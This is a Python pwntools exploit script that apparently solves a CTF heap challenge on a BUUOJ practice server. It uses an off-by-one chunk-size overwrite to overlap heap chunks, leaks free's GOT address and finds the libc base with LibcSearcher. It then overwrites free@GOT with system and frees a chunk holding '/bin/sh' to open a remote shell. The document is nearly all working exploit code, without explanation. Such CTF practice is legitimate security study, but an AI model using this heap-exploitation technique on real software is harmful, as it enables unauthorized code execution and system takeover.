#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from LibcSearcher import *

host = "node3.buuoj.cn"
port = 28629
#host = "10.211.55.28"
#port = 8888

r = remote(host,port)


def create(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def edit(idx,content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)

def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

free_got = 0x602018
create(0x18,"dada") # 0
create(0x10,"ddaa") # 1
edit(0, "/bin/sh\x00" +"a"*0x10 + "\x41")
delete(1)
create(0x30,p64(0)*4 +p64(0x30) +  p64(free_got)) #1
show(1)
r.recvuntil("Content : ")
data = r.recvuntil("Done !")

free_addr = u64(data.split("\n")[0].ljust(8,"\x00"))
libc = LibcSearcher('free',free_addr)
libc_base = free_addr - libc.dump('free')

system = libc_base + libc.dump('system')
edit(1,p64(system))
delete(0)
r.interactive()
